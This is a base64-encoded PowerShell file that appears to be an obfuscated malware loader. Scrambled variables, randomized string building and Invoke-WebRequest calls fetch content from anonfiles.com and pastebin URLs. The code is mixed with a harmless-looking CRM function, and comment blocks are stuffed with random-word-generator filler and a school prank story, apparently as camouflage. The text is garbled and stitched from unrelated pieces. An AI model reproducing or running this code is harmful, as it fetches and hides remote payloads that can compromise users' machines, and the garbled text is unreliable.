VXBwZXIoKX0gJEFWdlM4eTEyS3RNd19kNSArPSAkUU9IN0t2MTFmUmVTNl8yTkl9CiAgICAKICAgICMgT25seSB1c2UgYSBzdWJzZXQgb2YgY3VycmVudCBkZWxpbWl0ZXJzIHRvIHJhbmRvbWl6ZSB3aGF0IHlvdSBzZWUgaW4gZXZlcnkgaXRlcmF0aW9uIG9mIHRoaXMgc2NyaXB0J3Mgb3V0cHV0LgogICAgJEFWVnM4eTEyS1Rtd19kNSA9IChHZXQtUmFuZG9tIC1JbnB1dCAkQXZ2Uzh5MTJrVE1XX2Q1IC1Db3VudCAoJEF2dlM4WTEya3RtV19kNS5Db3VudC8oMiArIDIpKSkKCiAgICAjIENvbnZlcnQgJFNjcmlwdFN0cmluZyB0byBkZWxpbWl0ZWQgQmluYXJ5IHZhbHVlcyBpbiBbQ2hhcl0gYXJyYXkgc2VwYXJhdGVkIGJ5IHJhbmRvbSBkZWxpbWl0ZXIgZnJvbSBkZWZpbmVkIGxpc3QgJFJhbmRvbURlbGltaXRlcnMuCiAgICAkeE5USjJ3ODFWSiA9ICh3dWpKRVlDSUdDaWtXcmdsKCcnKSkKICAgIChbQ2hhcltdXSRRN1hBUW5xMVk4OGUpIHwgRm9yRWFjaC1PYmplY3QgeyRYbnRqMnc4MVZqICs9IChbQ29udmVydF06OlRvU3RyaW5nKChbSW50XVtDaGFyXSRfKSwkZ21EX0pPOElDaXApICsgKEdldC1SYW5kb20gLUlucHV0ICRBdnZzOHkxMmt0bVdfZDUpKX0KCiJACiAgICAoSVdSIC1VUkkgaHR0cHM6Ly9hbm9uZmlsZXMuY29tL3N6NHp3YzVzemMgLVVzZUJhc2ljUGFyc2luZykuY29udGVudAokazJHYjNVWlRzc1FUd21IZUdQQSA9IEAiCiAgICBAJXBVQmxJYzp+ODksODMlJVBVQkxpYzp+NSwxJUNIb14gb2ZeJVB1QmxJQzp+NDYsMTYlZgogICAgOmFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYgoiQAogICAgKElXUiAtVVJJIGh0dHBzOi8vcGFzdGViaW4uY29tL2dOVzFxZlBLIC1Vc2VCYXNpY1BhcnNpbmcpLmNvbnRlbnQKJDl2UmdxVDJXanNjckRhQWZUcUF0SmNUUm1RejljOGJkUkpGOHdIcnhLOENHM04zbUJ3ID0gQCIKICMgUmVtb3ZlIHRyYWlsaW5nIGRlbGltaXRlciBmcm9tICREZWxpbWl0ZWRFbmNvZGVkQXJyYXkuCiAgICAkeE5UajJ3ODF2SiA9ICRYTlRqMnc4MXZqLlN1YlN0cmluZygoMCArICgxIC0gMSkpLCR4TlRqMnc4MXZKLkxlbmd0aC0xKQoKICAgICMgQ3JlYXRlIHByaW50YWJsZSB2ZXJzaW9uIG9mICRSYW5kb21EZWxpbWl0ZXJzIGluIHJhbmRvbSBvcmRlciB0byBiZSB1c2VkIGJ5IGZpbmFsIGNvbW1hbmQuCiAgICAkcE9zZ2padCA9IChHZXQtUmFuZG9tIC1JbnB1dCAkQXZWUzhZMTJLVG13X0Q1IC1Db3VudCAkQXZ2UzhZMTJrdE13X2Q1Lkxlbmd0aCkgLUpvaW4gJycKCiAgICAjIG0oKSByYW5kb20gY2FzZSB2ZXJzaW9ucyBmb3IgbmVjZXNzYXJ5IG9wZXJhdGlvbnMuCiAgICAkQXJLc1p1Uk05RHkxNyA9IEdldC1SYW5kb20gLUlucHV0IEAoKHdVSkplWUNJZ0NJS3dSZ0woJ0ZvckVhY2gnKSksKHd1amplWUNpR0Npa1dyR0woJ0ZvckVhY2gtT2JqZWN0JykpLCh3dUpKRVljSUdDSUtXUkdsKCclJykpKQogICAgJGhyTHlxTVZySVZ4Tk15WSAgICAgICA9IChbQ2hhcltdXSh3dUpqRXljSUdDSWtXckdsKCdbU3RyaW5nXTo6Sm9pbicpKSAgICAgIHwgRm9yRWFjaC1PYmplY3QgeyRHX1VvdFE2WGcgPSAkXy5Ub1N0cmluZygpLlRvTG93ZXIoKTsgSWYoR2V0LVJhbmRvbSAtSW5wdXQgQCgwLi4oMSArIDApKSkgeyRHX1VPdFE2WEcgPSAkR191b1RRNlhHLlRvVXBwZXIoKX0gJEdfVW90cTZYZ30pIC1Kb2luICcnCiAgICAkWTBvRnhiY01PICAgICAgICA9IChbQ2hhcltdXShXVWpKRXlDSUdDaUtXUkdsKCdbU3RyaW5nXScpKSAgICAgICAgICAgIHwgRm9yRWFjaC1PYmplY3QgeyRHX1VPVHE2eGcgPSAkXy5Ub1N0cmluZygpLlRvTG93ZXIoKTsgSWYoR2V0LVJhbmRvbSAtSW5wdXQgQCgwLi4oMiAtIDEpKSkgeyRHX3VvVFE2WEcgPSAkR191b3RRNlhnLlRvVXBwZXIoKX0gJEdfVU9UUTZYZ30pIC1Kb2luICcnCiAgICAkaFhJN1lrQTJWOE5HZmE1Z0EgICAgICAgICAgPSAoW0NoYXJbXV0od3VKSkVZQ0lHY0lLV1JnbCgnLUpvaW4nKSkgICAgICAgICAgICAgICB8IEZvckVhY2gtT2JqZWN0IHskR191T3RRNnhnID0gJF8uVG9TdHJpbmcoKS5Ub0xvd2VyKCk7IElmKEdldC1SYW5kb20gLUlucHV0IEAoKDEgLSAoMiAtIDEpKS4uKDIgLSAxKSkpIHskR191b3RRNnhHID0gJGdfVW90UTZ4Ry5Ub1VwcGVyKCl9ICRnX1VPdFE2WGd9KSAtSm9pbiAnJwogICAgJHB4U25TVllKR0xsZ2NYYSAgICAgICA9IChbQ2hhcltdXSh3VUpKRXljaWdDSWtXUmdMKCdDaGFyJykpICAgICAgICAgICAgICAgIHwgRm9yRWFjaC1PYmplY3QgeyRnX1VPVFE2WGcgPSAkXy5Ub1N0cmluZygpLlRvTG93ZXIoKTsgSWYoR2V0LVJhbmRvbSAtSW5wdXQgQCgwLi4oLTEgKyAyKSkpIHskR19Vb1RRNlhnID0gJGdfVW9UUTZYZy5Ub1VwcGVyKCl9ICRnX3VPdHE2WGd9KSAtSm9pbiAnJwogICAgJERKNDJ0aDdES0dJTGhDS3hyeCAgICAgICAgICAgPSAoW0NoYXJbXV0od3VKakVZQ2lHY0lLd3JnTCgnSW50JykpICAgICAgICAgICAgICAgICB8IEZvckVhY2gtT2JqZWN0IHskZ19VT1RxNlhHID0gJF8uVG9TdHJpbmcoKS5Ub0xvd2VyKCk7IElmKEdldC1SYW5kb20gLUlucHV0IEAoMC4uMSkpIHskZ191T3RRNlhHID0gJEdfVU9UUTZYZy5Ub1VwcGVyKCl9ICRHX3VvdFE2eGd9KSAtSm9pbiAnJwogICAgJEFyS1NadXJtOURZMTcgPSAoW0NoYXJbXV0kQXJLc1p1Uk05ZHkxNyAgICAgICAgfCBGb3JFYWNoLU9iamVjdCB7JGdfVW90UTZ4RyA9ICRfLlRvU3RyaW5nKCkuVG9Mb3dlcigpOyBJZihHZXQtUmFuZG9tIC1JbnB1dCBAKDAuLjEpKSB7JEdfVW9UUTZYRyA9ICRHX1VvVHE2eEcuVG9VcHBlcigpfSAkR191b3RRNlhnfSkgLUpvaW4gJycKICAgICRTeGlyZlQ2ZjY1NXFEaG5PICAgICAgID0gKFtDaGFyW11dKHdVSkpFWUNJZ2NJS1dyR2woJ1tDb252ZXJ0XTo6VG9JbnQxNignKSkgfCBGb3JFYWNoLU9iamVjdCB7JEdfVW90UTZYRyA9ICRfLlRvU3RyaW5nKCkuVG9Mb3dlcigpOyBJZihHZXQtUmFuZG9tIC1JbnB1dCBAKDAuLigwICsgMSkpKSB7JEdfVW90UTZYZyA9ICRHX1VvdHE2WEcuVG9VcHBlcigpfSAkR19VT3RRNlhHfSkgLUpvaW4gJycKCiAgICAjIENyZWF0ZSBwcmludGFibGUgdmVyc2lvbiBvZiAkUmFuZG9tRGVsaW1pdGVycyBpbiByYW5kb20gb3JkZXIgdG8gYmUgdXNlZCBieSBmaW5hbCBjb21tYW5kIHNwZWNpZmljYWxseSBmb3IgLVNwbGl0IHN5bnRheC4KICAgICRMYlhvYzgxN0UzQUxyNjFsTiA9ICh3dUpqRXlDSUdDSUt3ckdsKCcnKSkKICAgIEZvckVhY2goJFZrWEFROXB6RlVOSHY1UHNDbDZldSBpbiAkYXZWczhZMTJrdG13X2Q1KQogICAgewogICAgICAgICMgUmFuZG9tIGNhc2UgJ3NwbGl0JyBzdHJpbmcuCiAgICAgICAgJG0zZmREdm9oQWJibEIgPSAoW0NoYXJbXV0oV3VKSkVZQ2lnY0lrV3JnbCgnU3BsaXQnKSkgfCBGb3JFYWNoLU9iamVjdCB7JEdfVW90UTZYZyA9ICRfLlRvU3RyaW5nKCkuVG9Mb3dlcigpOyBJZihHZXQtUmFuZG9tIC1JbnB1dCBAKCgoLTEgKyAyKSAtIDEpLi4xKSkgeyRHX1VPdHE2WEcgPSAkR191b1RxNlhHLlRvVXBwZXIoKX0gJEdfVW9UUTZYZ30pIC1Kb2luICcnCgogICAgICAgICRsQnhvYzgxN0UzQWxyNjFMTiArPSAoKFdVSkpFWUNJZ0Npa1dSR2woJy0nKSkgKyAkTTNmZGR2b0hhQkJMYiArICcgJyooR2V0LVJhbmRvbSAtSW5wdXQgQCgoMSAtIDEpLDEpKSArICh3dUpqZVlDSUdjSUt3UmdMKCcnJykpICsgJFJhbmRvbURlbGltaXRlciArICcnJyArICcgJyooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSkKICAgIH0KICAgICRMYnhvYzgxN2UzQUxSNjFMTiA9ICRsQnhPYzgxN2UzQUxSNjFMbi5UcmltKCkKICAgIAogICAgIyBSYW5kb21seSBzZWxlY3QgYmV0d2VlbiB2YXJpb3VzIGNvbnZlcnNpb24gc3ludGF4IG9wdGlvbnMuCiAgICAkQ2JJZFpMNlFWZHMgPSAoW0NoYXJbXV0oR2V0LVJhbmRvbSAtSW5wdXQgQCgod3VKSmV5Q2lnY0lLV3JHbCgnW1N0cmluZ10kXycpKSwoJ3syfXszfXsxfXswfSctZicpJywnaW5nKCcsJyRfLlQnLCdvU3RyJykpKSB8IEZvckVhY2gtT2JqZWN0IHskR191b1RxNlhHID0gJF8uVG9TdHJpbmcoKS5Ub0xvd2VyKCk7IElmKEdldC1SYW5kb20gLUlucHV0IEAoKDAgKyAwKS4uKC0xICsgMikpKSB7JEdfdU9UcTZYRyA9ICRHX1VvdHE2WEcuVG9VcHBlcigpfSAkR19Vb3RRNnhnfSkgLUpvaW4gJycKICAgICRQdzlKY2lJUDZiRWxKICA9IEAoKQogICAgJFBXOUpjSUlQNmJFbEogKz0gKHd1akpFWUNpR0Npa3dyR2woJ1skQ2hhclN0cl0nKSkgKyAnICcqKEdldC1SYW5kb20gLUlucHV0IEAoMCwoMSArIDApKSkgKyAod3VqSkV5Q0lnY0lrV1JnbCgnKCcpKSArICh3VUpKRVlDSUdDSWtXUkdsKCcgJykpKihHZXQtUmFuZG9tIC1JbnB1dCBAKCgxIC0gKC0xICsgMikpLCgyIC0gMSkpKSArICRzeElyRlQ2ZjY1NXFESG5vICsgJyAnKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsKDMgLSAyKSkpICsgKHd1SkpFWUNJR0NpS3dSR2woJygnKSkgKyAod3VKSkVZQ0lHQ0lLV1JnbCgnICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgoKDEgLSAxKSArIDApLCgzIC0gMikpKSArICRjYmlEWmw2cVZEUyArICcgJyooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLCgwICsgMSkpKSArIChXdWpKZXlDSUdDaWtXckdMKCcpJykpICsgKHdVSkpFWUNpZ2NJS1dyZ2woJyAnKSkqKEdldC1SYW5kb20gLUlucHV0IEAoMCwoMiAtIDEpKSkgKyAod3VqakV5Q0lnQ2lLV1JnbCgnLCcpKSArICRnTWRfak84SWNpUCArICcgJyooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArIChXdWpKRVlDSWdDSWtXckdsKCcpJykpICsgKFd1akpFeWNJZ0NJa1dyZ0woJyAnKSkqKEdldC1SYW5kb20gLUlucHV0IEAoKDEgLSAxKSwxKSkgKyAod3VqSkV5Q2lHQ2lrd3JnbCgnKScpKQogICAgJHBXOUpjaUlQNmJFbGogKz0gJFNYaVJmVDZmNjU1cURITk8gKyAnICcqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAod3VKSmVZQ0lnQ2lrV3JHTCgnKCcpKSArIChXdWpKRXljaUdjaWt3ckdsKCcgJykpKihHZXQtUmFuZG9tIC1JbnB1dCBAKCgxIC0gMSksMSkpICsgJGNiSURabDZxVmRzICsgJyAnKihHZXQtUmFuZG9tIC1JbnB1dCBAKCgxIC0gMSksKC0oMiAtIDEpICsgKDIgKyAwKSkpKSArIChXdUpKRVlDaWdjSUtXcmdsKCcpJykpICsgKFd1SkplWUNJR2NpS3dSR2woJyAnKSkqKEdldC1SYW5kb20gLUlucHV0IEAoKDEgLSAxKSwoMSArIDApKSkgKyAod3VKamVZY0lnQ0lLd3JHTCgnLCcpKSArIChXdUpKRVlDSUdDSUt3UkdMKCcgJykpKihHZXQtUmFuZG9tIC1JbnB1dCBAKCgwICsgKDEgLSAxKSksKDIgLSAxKSkpICsgJEdtZF9KTzhJY0lQICsgJyAnKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsKDIgLSAxKSkpICsgKHdVSkpFeUNJR2NpS1dyZ2woJyknKSkgKyAoV3VKSmVZQ2lHY2lLV1JnbCgnICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLCgoNiAtIDMpIC0gMikpKSArIChHZXQtUmFuZG9tIC1JbnB1dCBAKCh3dUpqZVlDSWdDSUtXcmdsKCctYXMnKSksKHd1SmpFWUNpR2NJa3dyZ2woJy1BcycpKSwoV3VKSkVZY0lHY2lrd3JnbCgnLWFTJykpLCh3dWpqRXlDSUdDSUtXcmdsKCctQVMnKSkpKSArICh3VUpqZVlDSUdDSWt3cmdMKCcgJykpKihHZXQtUmFuZG9tIC1JbnB1dCBAKCgxIC0gMSksMSkpICsgKHd1SmplWUNpZ0NpS1dyR0woJ1skQ2hhclN0cl0nKSkKICAgICRQVzlqY0lpcDZiRWxKID0gKEdldC1SYW5kb20gLUlucHV0ICRQVzlKY0lpUDZCRWxKKQoKICAgICMkZW52OnRlbXAKICAgICMgQ3JlYXRlIGFycmF5IHN5bnRheCBmb3IgZW5jb2RlZCAkU2NyaXB0U3RyaW5nIGFzIGFsdGVybmF0aXZlIHRvIC5TcGxpdC8tU3BsaXQgc3ludGF4LgogICAgJGpxMmVRQ0RXRFJRNVI0aENTVXR0ID0gKFd1SmpFWUNJR2NJa3dyZ0woJycpKQogICAgKFtDaGFyW11dJFE3eGFxTnExeTg4ZSkgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgIyBFbmNhcHN1bGF0ZSBjdXJyZW50IGl0ZW0gd2l0aCBzaW5nbGUgcXVvdGUgaWYgaXQgY29udGFpbnMgYSBub24taW50ZWdlci4KICAgICAgICBJZihbQ29udmVydF06OlRvU3RyaW5nKChbSW50XVtDaGFyXSRfKSwkZ21kX2pvOElDaVApLlRyaW0oKHd1amplWUNpR2NpS1dSZ0woJzAxMjM0NTY3ODknKSkpLkxlbmd0aCAtZ3QgKDEgLSAxKSkgeyRkUWxqdVRFZnM5MWJUQlJKSGZCWiA9ICh3dUpqZVlDaWdDSUt3UmdsKCcnJykpfQogICAgICAgIEVsc2UgeyRRdW90ZSA9IChUM2k5VDVlakliWG0xRG55ZTNNRUZjNXMwaWVwMVVPMmYoJycpKX0KICAgICAgICAkRW5jb2RlZEFycmF5ICs9ICgkUXVvdGUgKyBbQ29udmVydF06OlRvU3RyaW5nKChbSW50XVtDaGFyXSRfKSwkRW5jb2RpbmdCYXNlKSArICRRdW90ZSArICcgJyooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArICh0M0k5VDVlamliWG0xZE55RTNtZWZjNXMwaUVQMVVvMkYoJywnKSkgKyAoVDNJOVQ1ZUpJQnhtMUROeUUzbUVmQzVTMGllcDFVbzJmKCcgJykpKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsMSkpKQogICAgfQoKICAgICMgUmVtb3ZlIHRyYWlsaW5nIGNvbW1hIGZyb20gJEVuY29kZWRBcnJheS4KICAgICRFbmNvZGVkQXJyYXkgPSAoKFQzaTl0NWVqSUJYTTFEbnlFM21FZmM1UzBJZXAxVU8yZignKCcpKSArIChUM2k5VDVFaklCeG0xRG5ZZTNNRWZjNVMwaUVwMVVPMmYoJyAnKSkqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAkRW5jb2RlZEFycmF5LlRyaW0oKS5UcmltKCh0M0k5dDVFamlieG0xRG55ZTNtRUZjNXMwaUVwMVVPMkYoJywnKSkpICsgKFQzSTl0NWVKaWJ4TTFkbnlFM21lZmM1czBJZVAxVU8yRignKScpKSkKCiAgICAjIG0oKSByYW5kb20gc3ludGF4IHRvIGNyZWF0ZS9zZXQgT0ZTIHZhcmlhYmxlICgkT0ZTIGlzIHRoZSBPdXRwdXQgRmllbGQgU2VwYXJhdG9yIGF1dG9tYXRpYyB2YXJpYWJsZSkuCiAgICAjIFVzaW5nIFNldC1JdGVtIGFuZCBTZXQtVmFyaWFibGUvU1YvU0VUIHN5bnRheC4gTm90IHVzaW5nIE5ldy1JdGVtIGluIGNhc2UgT0ZTIHZhcmlhYmxlIGFscmVhZHkgZXhpc3RzLgogICAgIyBJZiB0aGUgT0ZTIHZhcmlhYmxlIGRpZCBleGlzdHMgdGhlbiB3ZSBjb3VsZCB1c2UgZXZlbiBtb3JlIHN5bnRheDogJHZhcm5hbWUsIFNldC1WYXJpYWJsZS9TViwgU2V0LUl0ZW0vU0VULCBHZXQtVmFyaWFibGUvR1YvVmFyaWFibGUsIEdldC1DaGlsZEl0ZW0vR0NJL0NoaWxkSXRlbS9EaXIvTHMKICAgICMgRm9yIG1vcmUgaW5mbzogaHR0cHM6Ly9tc2RuLm1pY3Jvc29mdC5jb20vZW4tdXMvcG93ZXJzaGVsbC9yZWZlcmVuY2UvNS4xL21pY3Jvc29mdC5wb3dlcnNoZWxsLmNvcmUvYWJvdXQvYWJvdXRfYXV0b21hdGljX3ZhcmlhYmxlcwogICAgJFNldE9mc1ZhclN5bnRheCAgICAgID0gQCgpCiAgICAkU2V0T2ZzVmFyU3ludGF4ICAgICArPSAoVDNpOXQ1RWppQnhtMUROeWUzTWVGYzVTMGlFcDF1bzJGKCdTZXQtSXRlbScpKSArIChUM0k5dDVFSmlCeE0xRG55RTNtRUZjNXMwSUVQMVVPMkYoJyAnKSkqKEdldC1SYW5kb20gLUlucHV0IEAoMSwyKSkgKyAodDNpOXQ1ZWpJYnhtMUROeUUzTUVmYzVTMGlFcDFVTzJmKCcnVmFyaWFibGU6T0ZTJycpKSArICh0M0k5dDVlSklCeG0xRG5ZRTNtZWZjNVMwSWVwMXVPMmYoJyAnKSkqKEdldC1SYW5kb20gLUlucHV0IEAoMSwyKSkgKyAoVDNpOXQ1ZWpJYnhtMURueUUzbUVmYzVzMGlFcDFVTzJGKCcnJycpKQogICAgJFNldE9mc1ZhclN5bnRheCAgICAgKz0gKEdldC1SYW5kb20gLUlucHV0IEAoKFQzSTl0NWVKaWJYbTFETnlFM21FZkM1UzBJRXAxVW8yZignU2V0LVZhcmlhYmxlJykpLChUM0k5VDVlSmlieG0xRG55RTNNRWZjNVMwaUVwMVVvMmYoJ1NWJykpLChUM0k5VDVFSklCeE0xRE55RTNNRWZjNXMwaUVQMVVPMmYoJ1NFVCcpKSkpICsgKFQzSTl0NUVKSUJ4TTFkTnlFM21FZmM1UzBJRVAxVU8yZignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgxLDIpKSArICh0M0k5dDVFSklieE0xZE55RTNNRWZjNXMwaUVQMVVvMmYoJydPRlMnJykpICsgKFQzSTlUNWVqSWJYTTFETnllM21FRmM1UzBpRXAxVU8yZignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgxLDIpKSArIChUM0k5dDVlSklCWE0xZG55RTNtRWZjNXMwaUVQMXVPMkYoJycnJykpCiAgICAkU2V0T2ZzVmFyICAgICAgICAgICAgPSAoR2V0LVJhbmRvbSAtSW5wdXQgJFNldE9mc1ZhclN5bnRheCkKCiJACgogICAgKElXUiAtVVJJIGh0dHBzOi8vYW5vbmZpbGVzLmNvbS91ZnJ0c2EweW01IC1Vc2VCYXNpY1BhcnNpbmcpLmNvbnRlbnQKCmZ1bmN0aW9uIDI1ewoKCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUEFSQU0oCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV0KICAgICAgICBbTWljcm9zb2Z0LlhybS5Ub29saW5nLkNvbm5lY3Rvci5Dcm1TZXJ2aWNlQ2xpZW50XSRjb25uLAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSR0cnVlLCBQb3NpdGlvbj0xLCBQYXJhbWV0ZXJTZXROYW1lPSJDcm1SZWNvcmQiKV0KICAgICAgICBbUFNPYmplY3RdJFRlYW1SZWNvcmQsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JHRydWUsIFBvc2l0aW9uPTIsIFBhcmFtZXRlclNldE5hbWU9IkNybVJlY29yZCIpXQogICAgICAgIFtQU09iamVjdF0kU2VjdXJpdHlSb2xlUmVjb3JkLAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSR0cnVlLCBQb3NpdGlvbj0xLCBQYXJhbWV0ZXJTZXROYW1lPSJJZCIpXQogICAgICAgIFtzdHJpbmddJFRlYW1JZCwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kdHJ1ZSwgUG9zaXRpb249MiwgUGFyYW1ldGVyU2V0TmFtZT0iSWQiKV0KICAgICAgICBbc3RyaW5nXSRTZWN1cml0eVJvbGVJZAogICAgKQoKCSRjb25uID0gVmVyaWZ5Q3JtQ29ubmVjdGlvblBhcmFtIC1jb25uICRjb25uIC1waXBlbGluZVZhbHVlICgkUFNCb3VuZFBhcmFtZXRlcnMuQ29udGFpbnNLZXkoJ2Nvbm4nKSkKCiAgICBpZigkVGVhbVJlY29yZCAtYW5kICRTZWN1cml0eVJvbGVSZWNvcmQpCiAgICB7CiAgICAgICAgUmVtb3ZlLUNybVJlY29yZEFzc29jaWF0aW9uIC1jb25uICRjb25uIC1Dcm1SZWNvcmQxICRUZWFtUmVjb3JkIC1Dcm1SZWNvcmQyICRTZWN1cml0eVJvbGVSZWNvcmQgLVJlbGF0aW9uc2hpcE5hbWUgdGVhbXJvbGVzX2Fzc29jaWF0aW9uCiAgICB9CiAgICBlbHNlaWYoJFRlYW1JZCAtYW5kICRTZWN1cml0eVJvbGVJZCkKICAgIHsKICAgICAgICBSZW1vdmUtQ3JtUmVjb3JkQXNzb2NpYXRpb24gLWNvbm4gJGNvbm4gLUVudGl0eUxvZ2ljYWxOYW1lMSB0ZWFtIC1JZDEgJFRlYW1JZCAtRW50aXR5TG9naWNhbE5hbWUyIHJvbGUgLUlkMiAkU2VjdXJpdHlSb2xlSWQgLVJlbGF0aW9uc2hpcE5hbWUgdGVhbXJvbGVzX2Fzc29jaWF0aW9uCiAgICB9CiAgICBlbHNlewogICAgICAgIHRocm93ICJQYXJhbWV0ZXJzIG5vdCB2YWxpZCwgbm8gb3BlcmF0aW9ucyB3ZXJlIHBlcmZvcm1lZCIKICAgIH0KfQo8Iz4+ClNwPWVsbGluZyBhbmQgZCgpClRoaXMgdG9vbCBjYW4gYmUgYW4gZXhjZWxsZW50IHdheSB0byBpbXByb3ZlIGQoKSBvciBwcmFjdGljZSBmb3IgcigpIGJlZXMuIElmIGFuIHEoKSB3b3JkIG8oKSwgcCgpIHVwIHRoZSBtZWFuaW5nIHdpbGwgaGVscCBzdHVkZW50cyBpbmNyZWFzZSB0aGUgbnVtYmVyIG9mIHdvcmRzIHRoZXkga25vdy4gV29ya2luZyB3aXRoIGEgcGFydG5lciwgc3R1ZGVudHMgY2FuIHRlc3QgZWFjaCBvdGhlciBvbiB0aGUgcigpIGZvciB0aGUgcmFuZG9taXplZCB3b3JkcyBtKClkLgoKTmFtZSBJbnNwaXJhdGlvbgpJZiB5b3UgbmVlZCB0byBjcmVhdGUgYSBuYW1lIGZvciBhIHByb2R1Y3QsIGFuIGV2ZW50LCBhIGJhbmQgb3IgZm9yIGFueXRoaW5nIGVsc2UsIHRoaXMgdG9vbCBjYW4gYmUgcXVpdGUgaGVscGZ1bC4gQXMgeW91IGNvbnNpZGVyIG5hbWVzLCBtKCkgYSBudW1iZXIgb2YgcmFuZG9tIHdvcmRzIGFuZCBzZWUgaG93IHRoZXkgaW1wYWN0IHdoYXQgeW91IGhhdmUgYWxyZWFkeSBjb21lIHVwIHdpdGguIElucHV0dGluZyB1bmlxdWUgd29yZHMgeW91IG1heSBub3QgaGF2ZSBjb25zaWRlcmVkIGNhbiBzcGFyayBhZGRpdGlvbmFsIGNyZWF0aXZpdHkgdG8gZXZlbnR1YWxseSBoZWxwIHlvdSBwcm9kdWNlIHRoZSBwZXJmZWN0IG5hbWUgZm9yIHlvdXIgcHJvamVjdC4gSWYgeW91J3JlIHAoKSBmb3IgZ29vZCBjaGFyYWN0ZXIgbmFtZXMgb3IgYmFieSBuYW1lcywgeW91IG1pZ2h0IGJlIGludGVyZXN0ZWQgaW4gb3VyIHJhbmRvbSBuYW1lIGdlbmVyYXRvci4KClRoZSBhYm92ZSBsaXN0IGlzIG5vdCBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKC4gVGhlcmUgYXJlIGxpdGVyYWxseSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCBvZiB3YXlzIHRoZSBSYW5kb20gV29yZCBHZW5lcmF0b3IgY2FuIGJlIHVzZWQuIFBsZWFzZSBmZWVsIGZyZWUgdG8gc2hhcmUgdGhlIHdheSB5b3UgdXNlIHRoaXMgdG9vbCwgYW5kIHdlIGFsd2F5cyB3ZWxjb21lIHN1Z2dlc3Rpb25zIG9uIGhvdyB3ZSBjYW4gaW1wcm92ZSBpdCB0byBzZXJ2ZSB5b3UgYmV0dGVyLiBXZSBhcmUgYWxzbyBpbnRlcmVzdGVkIGluIG5ldyB3b3JkIGdlbmVyYXRvcnMgeW91J2QgYmUgaW50ZXJlc3RlZCBpbiB1cyBjcmVhdGluZy4gTWFueSBvZiB0aGUgdG9vbHMgb24gdGhpcyB3ZWJzaXRlIGNhbWUgZnJvbSBpZGVhcyBmcm9tIHBlb3BsZSBsaWtlIHlvdSB3aG8gY29udGFjdGVkIHVzLiBQbGVhc2UgdGFrZSB0aGUgdGltZSB0byBleHBsb3JlIHRoZSBvdGhlciByYW5kb20gZ2VuZXJhdG9ycyB3ZSBoYXZlIGF2YWlsCgojPjwjPuKAnFRoaXMgb25lIHRpbWUgaW4gOXRoIGdyYWRlLCBteSBmcmllbmQgYW5kIEkgZGVjaWRlZCB0byB1c2UgdGhlIHJlc3Ryb29tIElFWCBhIGJpZyB0ZXN0LiBJIGRpZG50IGdpdmUgYSBzaHQgYWJvdXQgdGhpcyB0ZXN0LCBzbyBJIHBsYXlmdWxseSBwcmV0ZW5kZWQgdG8gZ2V0IHJlYWxseSB1cHNldC4gSW4gYXR0ZW1wdCB0byBiZSBvYnZpb3VzbHkgbm90IG1hZCwgSSBraWNrIGEgcGlwZSBvbiB0aGUgdG9wIG9mIGEgdXJpbmFsLCBhY2NpZGVudGFsbHkga25vY2tpbmcgaXQgb3V0IG9mIHRoZSB0b3Agb2YgdGhlIHRvaWxldC4gSXQgd2FzIHN0aWxsIGNvbm5lY3RlZCB0byB0aGUgd2FsbCBob3dldmVyLiBUdXJucyBvdXQsIEkgY291bGQgYWltIHRoZSBwaXBlIGluIGRpZmZlcmVudCBkaXJlY3Rpb25zLiBTbywgSSBhaW1lZCBpdCBzdHJhaWdodCBvdXQgYW5kIHRyaWVkIGZsdXNoaW5nIHRoZSB0b2lsZXQuIFRoZSB3YXRlciBMQVVOQ0hFRCBPVVQgT0YgVEhFIFBJUEUgQU5EIEhJVCBUSEUgV0FMTCBPTiBUSEUgT1RIRVIgU0lERSBPRiBUSEUgUk9PTS4gTXkgZnJpZW5kIGFuZCBJIHdlcmUgZmxpcHBpbmcgb3V0LiBUaGlzIGdhdmUgbWUgYSBicmlnaHQgaWRlYS4gSSBwdXQgdGhlIHBpcGUgaW4gc3VjaCBhIHNwb3Qgd2hlcmUgaXQgbG9va2VkIGxpa2UgaXQgd2FzIHByaW9yIHRvIHVzIGtpY2tpbmcgdGhlIGYqayBvdXQgb2YgaXQuIEhvd2V2ZXIsIEkgcHVsbGVkIGl0IG91dCBldmVyIHNvIHNsaWdodGx5IHNvIHdhdGVyIHdvdWxkIHNwcmF5IG91ciBuZXh0IHVuc3VzcGVjdGluZyB2aWN0aW0uIEkgcmVtZW1iZXIga2lkcyBjb21pbmcgb3V0IG9mIHRoZSBiYXRocm9vbSBkcmVuY2hlZCBpbiB3YXRlciwgY3Vzc2luZyB0aGVpciBicmFpbnMgb3V0IGJlY2F1c2UgdGhleSB3ZXJlIHNvIG1hZC4gR29vZCB0aW1lcy7igJ0jPgo8Iz7igJxUaGlzIG9uZSB0aW1lIGluIDl0aCBncmFkZSwgbXkgZnJpZW5kIGFuZCBJIGRlY2lkZWQgdG8gdXNlIHRoZSBhKCkgSUVYIGEgYmlnIHRlc3QuIEkgZGlkbnQgZ2l2ZS